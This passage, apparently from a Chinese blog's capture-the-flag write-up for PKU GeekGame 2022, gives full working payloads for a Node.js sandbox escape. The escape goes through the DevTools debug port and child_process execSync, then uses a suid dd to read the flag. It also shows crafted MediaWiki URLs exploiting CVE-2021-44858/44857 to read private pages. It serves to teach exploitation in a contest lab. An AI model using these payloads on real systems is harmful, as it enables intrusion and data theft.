<span class="token header"><span class="token header-name keyword">Accept-Language</span><span class="token punctuation">:</span> <span class="token header-value">zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span></span>
<span class="token header"><span class="token header-name keyword">Accept-Encoding</span><span class="token punctuation">:</span> <span class="token header-value">gzip, deflate, br</span></span>
<span class="token header"><span class="token header-name keyword">Referer</span><span class="token punctuation">:</span> <span class="token header-value">https://prob09-manager.geekgame.pku.edu.cn/</span></span>
<span class="token header"><span class="token header-name keyword">Content-Type</span><span class="token punctuation">:</span> <span class="token header-value">application/json</span></span>
<span class="token header"><span class="token header-name keyword">Content-Length</span><span class="token punctuation">:</span> <span class="token header-value">243</span></span>
<span class="token application-json">
<span class="token punctuation">{</span><span class="token property">"expr"</span><span class="token operator">:</span><span class="token string">"eval(unescape(/%2f%0a%2f%66%6c%61%67%7b%2e%2b%7d%2f%2e%65%78%65%63%28%64%6f%63%75%6d%65%6e%74%2e%71%75%65%72%79%53%65%6c%65%63%74%6f%72%28%27%73%63%72%69%70%74%27%29%2e%69%6e%6e%65%72%54%65%78%74%29%5b%30%5d%2f/))"</span><span class="token punctuation">,</span><span class="token property">"mode"</span><span class="token operator">:</span><span class="token string">"browser"</span><span class="token punctuation">}</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><code>flag{reg3x_byp4ss_made_easy}</code></p>
<h4 id="Flag-·-烂"><a href="#Flag-·-烂" class="headerlink" title="Flag · 烂"></a>Flag · 烂</h4><p>这个 flag 需要借助 Node.JS 沙箱，喵喵不会啊，摆烂了，这里就纯复现 wp 了</p>
<blockquote>
<p>Node.JS 沙箱运行在 esm 模式下，并通过 policy 禁用了<code>import</code>外部包。但我们仍然能访问<code>process</code>对象。</p>
<p>当一个<code>Node.JS</code>进程收到<code>SIGUSR1</code>信号时会进入调试模式，并在<code>127.0.0.1:9229</code>处暴露一个<code>DevTools API</code>。我们先使用<code>process.kill</code>向沙箱的父进程，也即后端主进程发送信号，在 Node.JS 沙箱里使用 fetch 去获取具体的 ws Endpoint，然后通过 Chrome 沙箱去连接这个 Endpoint，就能在后端主进程的上下文里运行代码——这一次将可以使用<code>require</code>来加载外部包，从而实现 RCE。</p>
<p>继而，我们可以使用<code>find</code>命令等手段寻找具有 suid 权限的二进制（本题中为<code>dd</code>），并使用其读取 flag 文件。</p>
<blockquote>
<p>这个 flag 的灵感来源于 Node.JS 新的<a target="_blank" rel="noopener" href="https://nodejs.org/api/permissions.html">Permissions API</a>。但就算用了这个 API，Node.JS 沙箱依然非常危险。</p>
</blockquote>
</blockquote>
<p><em>（您们真会玩啊</em></p>
<p>先执行 <code>process.kill(process.ppid, 'SIGUSR1')</code>，让沙箱的父进程进入调试模式</p>
<pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">{</span><span class="token property">"expr"</span><span class="token operator">:</span><span class="token string">"eval(unescape(/%2f%0a%70%72%6f%63%65%73%73%2e%6b%69%6c%6c%28%70%72%6f%63%65%73%73%2e%70%70%69%64%2c%20%27%53%49%47%55%53%52%31%27%29%2f/))"</span><span class="token punctuation">,</span><span class="token property">"mode"</span><span class="token operator">:</span><span class="token string">"node"</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="/2022/11/30/CTF_2022PKUGeekGame/image-20221231190740848.png"></p>
<p>然后获取 DevTools API</p>
<p><img src="/2022/11/30/CTF_2022PKUGeekGame/image-20221231190833973.png"></p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token function">fetch</span><span class="token punctuation">(</span><span class="token string">'http://127.0.0.1:9229/json/list'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token parameter">res</span> <span class="token operator">=&gt;</span> res<span class="token punctuation">.</span><span class="token function">text</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token punctuation">{</span><span class="token string-property property">"expr"</span><span class="token operator">:</span><span class="token string">"eval(unescape(/%2f%0a%66%65%74%63%68%28%27%68%74%74%70%3a%2f%2f%31%32%37%2e%30%2e%30%2e%31%3a%39%32%32%39%2f%6a%73%6f%6e%2f%6c%69%73%74%27%29%2e%74%68%65%6e%28%72%65%73%20%3d%3e%20%72%65%73%2e%74%65%78%74%28%29%29%2f/))"</span><span class="token punctuation">,</span><span class="token string-property property">"mode"</span><span class="token operator">:</span><span class="token string">"node"</span><span class="token punctuation">}</span>


<span class="token punctuation">[</span> <span class="token punctuation">{</span>
  <span class="token string-property property">"description"</span><span class="token operator">:</span> <span class="token string">"node.js instance"</span><span class="token punctuation">,</span>
  <span class="token string-property property">"devtoolsFrontendUrl"</span><span class="token operator">:</span> <span class="token string">"devtools://devtools/bundled/js_app.html?experiments=true&amp;v8only=true&amp;ws=127.0.0.1:9229/868794b9-884f-4f32-92c4-8934031e2c38"</span><span class="token punctuation">,</span>
  <span class="token string-property property">"devtoolsFrontendUrlCompat"</span><span class="token operator">:</span> <span class="token string">"devtools://devtools/bundled/inspector.html?experiments=true&amp;v8only=true&amp;ws=127.0.0.1:9229/868794b9-884f-4f32-92c4-8934031e2c38"</span><span class="token punctuation">,</span>
  <span class="token string-property property">"faviconUrl"</span><span class="token operator">:</span> <span class="token string">"https://nodejs.org/static/images/favicons/favicon.ico"</span><span class="token punctuation">,</span>
  <span class="token string-property property">"id"</span><span class="token operator">:</span> <span class="token string">"868794b9-884f-4f32-92c4-8934031e2c38"</span><span class="token punctuation">,</span>
  <span class="token string-property property">"title"</span><span class="token operator">:</span> <span class="token string">"backend/index.js"</span><span class="token punctuation">,</span>
  <span class="token string-property property">"type"</span><span class="token operator">:</span> <span class="token string">"node"</span><span class="token punctuation">,</span>
  <span class="token string-property property">"url"</span><span class="token operator">:</span> <span class="token string">"file:///app/backend/index.js"</span><span class="token punctuation">,</span>
  <span class="token string-property property">"webSocketDebuggerUrl"</span><span class="token operator">:</span> <span class="token string">"ws://127.0.0.1:9229/868794b9-884f-4f32-92c4-8934031e2c38"</span>
<span class="token punctuation">}</span> <span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>在 browser 端，借助 WebSocket 连接这个 webSocketDebuggerUrl，require 获取外部包 child_process 来执行命令</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token parameter">res</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
  <span class="token keyword">const</span> ws <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">WebSocket</span><span class="token punctuation">(</span><span class="token string">'ws://127.0.0.1:9229/868794b9-884f-4f32-92c4-8934031e2c38'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  ws<span class="token punctuation">.</span><span class="token function-variable function">onopen</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
    ws<span class="token punctuation">.</span><span class="token function-variable function">onmessage</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">e</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
      <span class="token function">res</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span><span class="token punctuation">;</span>
    ws<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
      <span class="token literal-property property">id</span><span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">,</span>
      <span class="token literal-property property">method</span><span class="token operator">:</span> <span class="token string">'Runtime.evaluate'</span><span class="token punctuation">,</span>
      <span class="token literal-property property">params</span><span class="token operator">:</span> <span class="token punctuation">{</span>
        <span class="token literal-property property">expression</span><span class="token operator">:</span> <span class="token string">"require('child_process').execSync('ls -al /').toString()"</span>
      <span class="token punctuation">}</span><span class="token punctuation">,</span>
    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>顺便，看下找提权的过程</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">ls</span> -al /
drwxr-xr-x   <span class="token number">1</span> root root   <span class="token number">65</span> Dec <span class="token number">31</span> <span class="token number">10</span>:51 <span class="token builtin class-name">.</span>
drwxr-xr-x   <span class="token number">1</span> root root   <span class="token number">65</span> Dec <span class="token number">31</span> <span class="token number">10</span>:51 <span class="token punctuation">..</span>
-rwxr-xr-x   <span class="token number">1</span> root root    <span class="token number">0</span> Dec <span class="token number">31</span> <span class="token number">10</span>:51 .dockerenv
drwxr-xr-x   <span class="token number">1</span> root root   <span class="token number">21</span> Nov <span class="token number">12</span> 05:14 app
drwxr-xr-x   <span class="token number">1</span> root root   <span class="token number">16</span> Nov <span class="token number">12</span> 05:13 bin
drwxr-xr-x   <span class="token number">2</span> root root    <span class="token number">6</span> Sep  <span class="token number">3</span> <span class="token number">12</span>:10 boot
drwxr-xr-x   <span class="token number">5</span> root root  <span class="token number">340</span> Dec <span class="token number">31</span> <span class="token number">10</span>:51 dev
drwxr-xr-x   <span class="token number">1</span> root root   <span class="token number">66</span> Dec <span class="token number">31</span> <span class="token number">10</span>:51 etc
-r--r--r--   <span class="token number">1</span> root root   <span class="token number">35</span> Dec <span class="token number">31</span> <span class="token number">10</span>:51 flag
drwxr-xr-x   <span class="token number">1</span> root root   <span class="token number">22</span> Nov <span class="token number">12</span> 05:14 home
drwxr-xr-x   <span class="token number">1</span> root root   <span class="token number">86</span> Nov <span class="token number">12</span> 05:13 lib
drwxr-xr-x   <span class="token number">2</span> root root   <span class="token number">34</span> Oct <span class="token number">24</span> 00:00 lib64
drwxr-xr-x   <span class="token number">2</span> root root    <span class="token number">6</span> Oct <span class="token number">24</span> 00:00 media
drwxr-xr-x   <span class="token number">2</span> root root    <span class="token number">6</span> Oct <span class="token number">24</span> 00:00 mnt
drwxr-xr-x   <span class="token number">1</span> root root   <span class="token number">20</span> Nov <span class="token number">12</span> 05:13 opt
dr-xr-xr-x <span class="token number">689</span> root root    <span class="token number">0</span> Dec <span class="token number">31</span> <span class="token number">10</span>:51 proc
drwx------   <span class="token number">1</span> root root   <span class="token number">18</span> Nov  <span class="token number">8</span> <span class="token number">18</span>:29 root
drwxr-xr-x   <span class="token number">3</span> root root   <span class="token number">30</span> Oct <span class="token number">24</span> 00:00 run
drwxr-xr-x   <span class="token number">1</span> root root   <span class="token number">25</span> Dec <span class="token number">31</span> <span class="token number">10</span>:51 sbin
drwxr-xr-x   <span class="token number">2</span> root root <span class="token number">4096</span> Dec <span class="token number">31</span> <span class="token number">10</span>:51 sock
drwxr-xr-x   <span class="token number">2</span> root root    <span class="token number">6</span> Oct <span class="token number">24</span> 00:00 srv
dr-xr-xr-x  <span class="token number">13</span> root root    <span class="token number">0</span> Dec <span class="token number">31</span> <span class="token number">10</span>:51 sys
drwxrwxrwt   <span class="token number">1</span> root root   <span class="token number">65</span> Dec <span class="token number">31</span> <span class="token number">11</span>:16 tmp
drwxr-xr-x   <span class="token number">1</span> root root   <span class="token number">96</span> Oct <span class="token number">24</span> 00:00 usr
drwxr-xr-x   <span class="token number">1</span> root root   <span class="token number">17</span> Oct <span class="token number">24</span> 00:00 var

$ <span class="token function">find</span> /bin -perm -u<span class="token operator">=</span>s -type f <span class="token operator"><span class="token file-descriptor important">2</span>&gt;</span>/dev/null
/bin/dd
/bin/mount
/bin/su
/bin/umount<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>最后用 dd 来读 flag</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">/bin/dd <span class="token assign-left variable">if</span><span class="token operator">=</span>/flag<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="/2022/11/30/CTF_2022PKUGeekGame/image-20221231191513445.png"></p>
<pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token request-line"><span class="token method property">POST</span> <span class="token request-target url">/submit</span> <span class="token http-version property">HTTP/2</span></span>
<span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">prob09-h5rdr7ox.geekgame.pku.edu.cn</span></span>
<span class="token header"><span class="token header-name keyword">User-Agent</span><span class="token punctuation">:</span> <span class="token header-value">Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0</span></span>
<span class="token header"><span class="token header-name keyword">Accept</span><span class="token punctuation">:</span> <span class="token header-value">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span></span>
<span class="token header"><span class="token header-name keyword">Accept-Language</span><span class="token punctuation">:</span> <span class="token header-value">zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span></span>
<span class="token header"><span class="token header-name keyword">Accept-Encoding</span><span class="token punctuation">:</span> <span class="token header-value">gzip, deflate, br</span></span>
<span class="token header"><span class="token header-name keyword">Referer</span><span class="token punctuation">:</span> <span class="token header-value">https://prob09-manager.geekgame.pku.edu.cn/</span></span>
<span class="token header"><span class="token header-name keyword">Content-Type</span><span class="token punctuation">:</span> <span class="token header-value">application/json</span></span>
<span class="token header"><span class="token header-name keyword">Content-Length</span><span class="token punctuation">:</span> <span class="token header-value">1236</span></span>
<span class="token application-json">
<span class="token punctuation">{</span><span class="token property">"expr"</span><span class="token operator">:</span><span class="token string">"eval(unescape(/%2f%0a%0a%6e%65%77%20%50%72%6f%6d%69%73%65%28%72%65%73%20%3d%3e%20%7b%0a%20%20%63%6f%6e%73%74%20%77%73%20%3d%20%6e%65%77%20%57%65%62%53%6f%63%6b%65%74%28%27%77%73%3a%2f%2f%31%32%37%2e%30%2e%30%2e%31%3a%39%32%32%39%2f%38%36%38%37%39%34%62%39%2d%38%38%34%66%2d%34%66%33%32%2d%39%32%63%34%2d%38%39%33%34%30%33%31%65%32%63%33%38%27%29%3b%0a%20%20%77%73%2e%6f%6e%6f%70%65%6e%20%3d%20%28%29%20%3d%3e%20%7b%0a%20%20%20%20%77%73%2e%6f%6e%6d%65%73%73%61%67%65%20%3d%20%28%65%29%20%3d%3e%20%7b%0a%20%20%20%20%20%20%72%65%73%28%65%2e%64%61%74%61%29%3b%0a%20%20%20%20%7d%3b%0a%20%20%20%20%77%73%2e%73%65%6e%64%28%4a%53%4f%4e%2e%73%74%72%69%6e%67%69%66%79%28%7b%0a%20%20%20%20%20%20%69%64%3a%20%31%2c%0a%20%20%20%20%20%20%6d%65%74%68%6f%64%3a%20%27%52%75%6e%74%69%6d%65%2e%65%76%61%6c%75%61%74%65%27%2c%0a%20%20%20%20%20%20%70%61%72%61%6d%73%3a%20%7b%0a%20%20%20%20%20%20%20%20%65%78%70%72%65%73%73%69%6f%6e%3a%20%22%72%65%71%75%69%72%65%28%27%63%68%69%6c%64%5f%70%72%6f%63%65%73%73%27%29%2e%65%78%65%63%53%79%6e%63%28%27%2f%62%69%6e%2f%64%64%20%69%66%3d%2f%66%6c%61%67%27%29%2e%74%6f%53%74%72%69%6e%67%28%29%22%0a%20%20%20%20%20%20%7d%2c%0a%20%20%20%20%7d%29%29%3b%0a%20%20%7d%3b%0a%7d%29%0a%20%20%2f/))"</span><span class="token punctuation">,</span><span class="token property">"mode"</span><span class="token operator">:</span><span class="token string">"browser"</span><span class="token punctuation">}</span>


<span class="token punctuation">{</span><span class="token property">"result"</span><span class="token operator">:</span><span class="token string">"{\"id\":1,\"result\":{\"result\":{\"type\":\"string\",\"value\":\"flag{nOde_sANdbox_1s_alwaYs_risky}\\n\"}}}"</span><span class="token punctuation">}</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<blockquote>
<p><a target="_blank" rel="noopener" href="http://nodejs.cn/api-v12/policy.html">Node.js policy 安全策略</a></p>
</blockquote>
<h3 id="私有笔记"><a href="#私有笔记" class="headerlink" title="私有笔记"></a>私有笔记</h3><blockquote>
<p>大家或许做过 Hackergame 2022 “Flag 的痕迹”一题，或许没做过，这不重要。</p>
<p>总之，现在2020年小 Z 在自己的机器上部署了一个 MediaWiki 用于记录自己的笔记，把 Flag 放在里面，然后想方设法不让其他人看到。 但是，这次不仅 Flag 被泄漏了，黑客还在机器上干了更多坏事……</p>
<p>一些说明：</p>
<ol>
<li>此题和 Hackergame 的题目解法没有直接联系。</li>
<li>此题不是代码审计题，一开始就阅读源代码是错误的选择。</li>
</ol>
<p> 你可以 <a target="_blank" rel="noopener" href="https://prob07-manager.geekgame.pku.edu.cn/docker-manager/start?xxxx">访问题目网页</a></p>
</blockquote>
<h4 id="知识，与你分享"><a href="#知识，与你分享" class="headerlink" title="知识，与你分享"></a>知识，与你分享</h4><p>访问 /index.php/特殊:版本</p>
<p><img src="/2022/11/30/CTF_2022PKUGeekGame/image-20221124052728908.png"></p>
<p>MediaWiki  1.34.4</p>
<p>老版本了，大概率有 CVE，要不然就是哪家插件锅了能 RCE 之类的。</p>
<p><a target="_blank" rel="noopener" href="https://www.mediawiki.org/wiki/2021-12_security_release/FAQ">https://www.mediawiki.org/wiki/2021-12_security_release/FAQ</a></p>
<p>（中文：<a target="_blank" rel="noopener" href="https://www.mediawiki.org/wiki/2021-12_security_release/FAQ/zh">https://www.mediawiki.org/wiki/2021-12_security_release/FAQ/zh</a></p>
<blockquote>
<ul>
<li>CVE-2021-44858: The “undo” feature (<code>action=edit&amp;undo=##&amp;undoafter=###</code>) allowed an attacker to view the contents of arbitrary revisions,  regardless of whether they had permissions to do so. This was also found in the “mcrundo” and “mcrrestore” actions (<code>action=mcrundo</code> and <code>action=mcrrestore</code>).</li>
<li>CVE-2021-45038: The “rollback” feature (<code>action=rollback</code>) could be passed a specially crafted parameter that allowed an attacker  to view the contents of arbitrary pages, regardless of whether they had  permissions to do so.</li>
<li>CVE-2021-44857: The “mcrundo” and “mcrrestore” actions (<code>action=mcrundo</code> and <code>action=mcrrestore</code>) did not properly check for editing permissions, and allowed an attacker to take the content of any arbitrary revision and save it on any page  of their choosing. This affects both public wikis and public pages on  private wikis.</li>
</ul>
</blockquote>
<p>如果是私有 wiki 站点，而且在<code>$wgWhitelistRead</code>和<code>$wgWhitelistReadRegexp</code>设置有页面（也就是 <a target="_blank" rel="noopener" href="https://www.mediawiki.org/wiki/Manual:$wgWhitelistRead/zh">一些匿名用户能够阅读的页面</a>），那就会受影响。</p>
<p><a target="_blank" rel="noopener" href="https://phabricator.wikimedia.org/T297322">CVE-2021-44857, CVE-2021-44858: Unauthorized users can undo edits on any protected page and view contents of private wikis using mcrundo</a></p>
<blockquote>
<p>The mcrundo action seems to do no checks at all for if users have  permission to perform edits on that page. This means any user can undo  edits on any protected page, such as the main page. E.g. this URL: <a target="_blank" rel="noopener" href="https://commons.wikimedia.org/w/index.php?title=Main_Page&amp;action=mcrundo&amp;undo=603639572&amp;undoafter=600544238">https://commons.wikimedia.org/w/index.php?title=Main_Page&amp;action=mcrundo&amp;undo=603639572&amp;undoafter=600544238</a> will allow you to undo an edit on the main page.</p>
</blockquote>
<p><a target="_blank" rel="noopener" href="https://gerrit.wikimedia.org/r/c/mediawiki/core/+/747596">747596: SECURITY: Fix permissions checks in undo actions</a></p>
<blockquote>
<p>Both traditional action=edit&amp;undo= and the newer action=mcrundo/action=mcrrestore endpoints suffer from a flaw that allows for leaking entire private wikis by enumerating through revision IDs when at least one page was publicly accessible via $wgWhitelistRead. This is <a target="_blank" rel="noopener" href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-44858">CVE-2021-44858</a>. </p>
<p><a target="_blank" rel="noopener" href="https://gerrit.wikimedia.org/r/q/05f06286f4def">05f06286f4def</a> removed the restriction that user-supplied undo IDs belong ot the same page, and was then copied into mcrundo. This check has been restored by using RevisionLookup::getRevisionByTitle(), which returns null if the revid is on a different page. This will break the workflow outlined in <a target="_blank" rel="noopener" href="https://phabricator.wikimedia.org/T58184">T58184</a>, but that could be restored in the future with better access control checks. </p>
<p>action=mcrundo/action=restore suffer from an additional flaw that allows for bypassing most editing restrictions. It makes no check on whether user has the ‘edit’ permission or can even edit that page (page protection, etc.). This is <a target="_blank" rel="noopener" href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-44857">CVE-2021-44857</a>. </p>
<p>This has been fixed by requiring the ‘edit’ permission to even invoke the action (via Action::getRestriction()), as well as checking the user’s permissions to edit the specific page before saving. </p>
<p>The EditFilterMergedContent hook is also run against the revision before it’s saved so SpamBlacklist, AbuseFilter, etc. have a chance to review the new page contents before saving. </p>
<p>Kudos to Dylsss for the identification and report. </p>
<p>Bug: <a target="_blank" rel="noopener" href="https://phabricator.wikimedia.org/T297322">T297322</a> </p>
<p>Co-authored-by: Taavi Väänänen <a href="mailto:hi@taavi.wtf">hi@taavi.wtf</a> </p>
<p>Change-Id: <a target="_blank" rel="noopener" href="https://gerrit.wikimedia.org/r/q/I496093adfcf5a0e30774d452b650b751518370ce">I496093adfcf5a0e30774d452b650b751518370ce</a></p>
</blockquote>
<p>如果 action 为 <code>edit</code> 或者新的 <code>mcrundo</code> / <code>mcrrestore</code> 这些，因为在 <a href="includes/EditPage.php">includes/EditPage.php</a> 和 <a href="includes/actions/McrUndoAction.php">includes/actions/McrUndoAction.php</a> 没有对页面的 edit 行为进行权限限制从而可以绕过来读私有页面</p>
<p>这里的意思大概是要穷举 revision IDs，有点像上个月 hackergame 里那个 Wiki 里群友尝试过但失败了的方法</p>
<p>爆破一下 undo 和 undoafter，盲猜 undo 是之前的，undoafter 是修改后的</p>
<p>发现是 <a target="_blank" rel="noopener" href="https://prob07-xxx.geekgame.pku.edu.cn/w/index.php?title=%E9%A6%96%E9%A1%B5&amp;action=mcrundo&amp;undo=1&amp;undoafter=2">https://prob07-xxx.geekgame.pku.edu.cn/w/index.php?title=%E9%A6%96%E9%A1%B5&amp;action=mcrundo&amp;undo=1&amp;undoafter=2</a></p>
<p><img src="/2022/11/30/CTF_2022PKUGeekGame/image-20221125045216430.png"></p>
<p><img src="/2022/11/30/CTF_2022PKUGeekGame/image-20221125045353633.png"></p>
<p>当然也可以是 <code>edit</code></p>
<p><a target="_blank" rel="noopener" href="https://prob07-xxx.geekgame.pku.edu.cn/w/index.php?title=%E9%A6%96%E9%A1%B5&amp;action=edit&amp;undo=1&amp;undoafter=2">https://prob07-xxx.geekgame.pku.edu.cn/w/index.php?title=%E9%A6%96%E9%A1%B5&amp;action=edit&amp;undo=1&amp;undoafter=2</a></p>
<p><img src="/2022/11/30/CTF_2022PKUGeekGame/image-20221125045418700.png"></p>
<p><code>flag{insecure_01d_mediavviki}</code></p>
<p>当然还可以用另一个 CVE，通过 rollback 来读 private wiki 的内容</p>
<pre class="line-numbers language-none"><code class="language-none">https://prob07-xxx.geekgame.pku.edu.cn/index.php?action=rollback&amp;from={{:Flag}}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="/2022/11/30/CTF_2022PKUGeekGame/image-20221129100715725.png"></p>
<h4 id="来我家做客吧"><a href="#来我家做客吧" class="headerlink" title="来我家做客吧"></a>来我家做客吧</h4><p>这问盲猜就是扩展程序锅了能任意读文件甚至 RCE，而这里就一个 Score，搜一下就搜到了</p>
<p>正好放了提示</p>
<blockquote>
<p><strong>第二阶段提示：</strong></p>
<ul>
<li>提供以下配置文件：<a target="_blank" rel="noopener" href="https://geekgame.pku.edu.cn/service/attachment/prob07/Dockerfile">Dockerfile</a>、<a target="_blank" rel="noopener" href="https://geekgame.pku.edu.cn/service/attachment/prob07/LocalSettings.php">LocalSettings.php</a>。</li>
<li>2021年12月，MediaWiki爆出<strong>一系列</strong>漏洞，允许攻击者访问私有 wiki 的任何内容，以及修改公开 wiki 的任何页面（例如维基百科的首页）。所幸，漏洞被发现并修复前没有造成已知的负面影响。</li>
<li>2020年7月，Score扩展爆出漏洞，允许攻击者执行任意命令。漏洞发现不久，Score扩展就在维基媒体计划禁用了。在此漏洞的修复过程中，又发现了一系列绕过方法。维基媒体计划的最终的处理方法是把LilyPond放到一个独立的容器运行；13个月后（2021年8月），Score扩展才被重新启用。</li>
<li>可以参考MediaWiki bug report system对相关漏洞的讨论。</li>
</ul>
</blockquote>
<p>顺便，这个 <code>Dockerfile</code> 也提示了 <code>old_id=2</code>，也就是上一问应该取 <code>undoafter=2</code> 了</p>
<pre class="line-numbers language-docker" data-language="docker"><code class="language-docker"><span class="token instruction"><span class="token keyword">FROM</span> mediawiki:1.34</span>

<span class="token instruction"><span class="token keyword">RUN</span> sed -i <span class="token string">"s@http://.*deb.debian.org@http://mirrors.aliyun.com@g"</span> /etc/apt/sources.list</span>
<span class="token instruction"><span class="token keyword">RUN</span> sed -i <span class="token string">"s@http://.*security.debian.org@http://mirrors.aliyun.com@g"</span> /etc/apt/sources.list</span>
<span class="token instruction"><span class="token keyword">RUN</span> apt-get update</span>
<span class="token instruction"><span class="token keyword">RUN</span> apt-get install -y sqlite3 lilypond</span>
<span class="token instruction"><span class="token keyword">RUN</span> git clone https://gitlab.com/debugger-zhang/Score.git /var/www/html/extensions/Score --depth=1</span>
<span class="token instruction"><span class="token keyword">COPY</span> my_wiki.sqlite /var/www/data/</span>
<span class="token instruction"><span class="token keyword">COPY</span> my_wiki_jobqueue.sqlite /var/www/data/</span>
<span class="token instruction"><span class="token keyword">COPY</span> my_wiki_l10n_cache.sqlite /var/www/data/</span>
<span class="token instruction"><span class="token keyword">RUN</span> chown www-data:www-data /var/www/data/*</span>
<span class="token instruction"><span class="token keyword">RUN</span> mkdir /var/www/data/locks &amp;&amp; chown www-data:www-data /var/www/data/locks</span>
<span class="token instruction"><span class="token keyword">COPY</span> .htaccess /var/www/data/</span>
<span class="token instruction"><span class="token keyword">COPY</span> LocalSettings.php /var/www/html/</span>
<span class="token instruction"><span class="token keyword">COPY</span> flag1 /</span>
<span class="token instruction"><span class="token keyword">COPY</span> flag2 /</span>
<span class="token instruction"><span class="token keyword">RUN</span> rm -rf /var/www/html/mw-config</span>
<span class="token instruction"><span class="token keyword">RUN</span> sqlite3 -line /var/www/data/my_wiki.sqlite <span class="token string">"UPDATE text SET old_text='You can use the following username and password to login:'||char(10)||'* User name: Flag1'||char(10)||'* Password: `cat /flag1`'||char(10)||char(10)||'Try RCE to find Flag 2.' WHERE old_id=2"</span></span>
<span class="token instruction"><span class="token keyword">RUN</span> php /var/www/html/maintenance/changePassword.php --user=Flag1 --password=`cat /flag1`</span>
<span class="token comment">#RUN sed -i "s/127.0.0.1:8080/$hackergame_host/g" LocalSettings.php</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><strong><a target="_blank" rel="noopener" href="https://www.mediawiki.org/wiki/Extension:Score/2021_security_advisory">Extension:Score/2021 security advisory</a></strong></p>
<blockquote>
<p>In summary, the following security issues were discovered:</p>
<ul>
<li>CVE-2020-29007, MediaWiki Score allows executing arbitrary Scheme code</li>
<li>CVE-2020-17353, LilyPond allows arbitrary PostScript and does not use -dSAFER<ul>
<li>Mitigated in Score by having MediaWiki run Ghostscript directly instead of relying on Lilypond, see <a target="_blank" rel="noopener" href="https://gerrit.wikimedia.org/r/c/mediawiki/extensions/Score/%2B/615594">gerrit:615594</a>.</li>
<li><a target="_blank" rel="noopener" href="https://git.savannah.gnu.org/gitweb/?p=lilypond.git;a=commit;h=b84ea4740f3279516905c5db05f4074e777c16ff">Upstream fix</a></li>
</ul>
</li>
<li>CVE-2020-17367, CVE-2020-17368: Vulnerabilities in firejail due to –output<ul>
<li>Mitigated in MediaWiki by disallowing usage of parameters named –output, see <a target="_blank" rel="noopener" href="https://gerrit.wikimedia.org/r/629729">gerrit:629729</a>.</li>
<li><a target="_blank" rel="noopener" href="https://github.com/netblue30/firejail/releases/tag/0.9.62.2">Upstream fixes included in 0.9.62.2</a></li>
</ul>
</li>
<li><a target="_blank" rel="noopener" href="https://phabricator.wikimedia.org/T259210">CVE-2020-17354: not yet publicly disclosed</a></li>
<li><a target="_blank" rel="noopener" href="https://phabricator.wikimedia.org/T260225">T260225: not yet publicly disclosed, no CVE assigned yet</a></li>
</ul>
<p><a target="_blank" rel="noopener" href="https://phabricator.wikimedia.org/T257062">T257062</a> and its subtasks was where most coordination and discussion happened.  Some more discussion about improving LilyPond’s security took place on  the <a target="_blank" rel="noopener" href="https://lists.gnu.org/archive/html/lilypond-devel/2020-10/msg00096.html">lilypond-devel mailing list</a> and in private email.</p>
<hr>
